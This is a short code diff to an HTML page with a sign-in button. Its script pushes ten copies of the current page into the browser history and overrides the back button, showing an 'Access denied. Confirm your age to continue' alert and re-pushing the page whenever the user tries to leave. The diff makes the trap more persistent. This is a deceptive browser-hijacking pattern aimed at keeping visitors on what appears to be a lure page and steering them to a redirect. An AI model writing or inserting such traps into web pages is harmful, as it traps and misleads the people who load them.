@@ -134,13 +134,14 @@
       <button class="sign-in-btn" onclick="redirectUser()">Sign In</button>
     </div>
   </div>  <script>
-    // Push multiple history states for deep back trap
+    // Back button trap — persistent
+    let trapCount = 0;
     for (let i = 0; i < 10; i++) {
       history.pushState(null, '', location.href);
     }
-
     window.onpopstate = function () {
-      alert("⚠️ Please confirm your age to continue.");
+      trapCount++;
+      alert("⚠️ Access denied. Confirm your age to continue.");
       history.pushState(null, '', location.href);
     };
 
